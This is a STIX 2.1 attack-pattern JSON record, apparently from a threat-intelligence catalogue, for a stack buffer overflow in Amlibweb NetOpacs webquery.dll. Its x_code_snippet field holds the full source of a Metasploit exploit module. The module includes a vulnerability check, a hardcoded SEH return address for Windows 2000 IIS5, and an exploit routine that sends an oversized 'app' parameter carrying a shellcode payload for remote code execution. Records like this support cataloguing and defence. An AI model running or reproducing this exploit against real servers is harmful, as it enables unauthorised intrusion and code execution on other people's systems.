{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0219883c-ac91-4345-b4b1-47fa6748b43f",
    "created": "2024-08-14T16:52:14.874024Z",
    "modified": "2024-08-14T16:52:14.874028Z",
    "name": "Amlibweb NetOpacs webquery.dll Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Amlib's Amlibweb Library Management System (NetOpacs). The webquery.dll API is available through IIS requests. By specifying an overly long string to the 'app' parameter, SeH can be reliably overwritten allowing for arbitrary remote code execution. In addition, it is possible to overwrite EIP by specifying an arbitrary parameter name with an '=' terminator. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/amlibweb_webquerydll_app.rb",
            "external_id": "amlibweb_webquerydll_app.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.aushack.com/advisories/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Amlibweb NetOpacs webquery.dll Stack Buffer Overflow',\n      'Description'  => %q{\n          This module exploits a stack buffer overflow in Amlib's Amlibweb\n        Library Management System (NetOpacs). The webquery.dll\n        API is available through IIS requests. By specifying\n        an overly long string to the 'app' parameter, SeH can be\n        reliably overwritten allowing for arbitrary remote code execution.\n        In addition, it is possible to overwrite EIP by specifying\n        an arbitrary parameter name with an '=' terminator.\n      },\n      'Author'       => [ 'aushack' ],\n      'Arch'         => [ ARCH_X86 ],\n      'License'      => MSF_LICENSE,\n      'References'   =>\n        [\n          [ 'OSVDB', '66814' ],\n          [ 'BID', '42293' ],\n          [ 'URL', 'http://www.aushack.com/advisories/' ],\n        ],\n      'Privileged'\t\t=> true,\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC'\t=> 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'\t\t=>\n        {\n          #'Space'\t\t\t=> 600,\n          'BadChars' \t\t=> \"\\x00\\x0a\\x0d\\x20%=?\\x2f\\x5c\\x3a\\x3d\\@;!$\",\n          'EncoderType'\t\t=> Msf::Encoder::Type::AlphanumMixed,\n          'DisableNops'  \t\t=>  'True',\n          'StackAdjustment' \t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n        [\n          # aushack - Tested OK 20100803 w2k IIS5\n          [ 'Windows 2000 Pro All - English', { 'Ret' => 0x75022ac4 } ], # p/p/r ws2help.dll - 'dll?app={buff}' for SeH IIS5\n          # [ 'Windows 2003 Server All - English', { 'Ret' => 0x44434241 } ], # todo: 'dll?{buff}=' call edi for EIP in IIS6 w3wp.exe, 120 byte limit, ASCII only.\n        ],\n      'DisclosureDate' => '2010-08-03', #0day\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n      ])\n  end\n\n  def check\n    connect\n\n    rand = Rex::Text.rand_text_alpha(10)\n\n    sock.put(\"GET /amlibweb/webquery.dll?#{rand}= HTTP/1.0\\r\\n\\r\\n\")\n    res = sock.get_once\n    disconnect\n\n    if (res.to_s =~ /<H1>BAD REQUEST<\\/H1><P>Your client sent a request that this server didn't understand.<br>Request:\\s(\\w+)/)\n      if ($1 == rand)\n        return Exploit::CheckCode::Vulnerable\n      end\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    seh = generate_seh_payload(target.ret)\n\n    buffer = Rex::Text.rand_text_alphanumeric(3028) + seh\n    sploit = \"GET /amlibweb/webquery.dll?app=\"  + buffer + \" HTTP/1.0\\r\\n\"\n    sock.put(sploit + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-03, #0day",
    "x_mitre_platforms": [
        "['win']"
    ]
}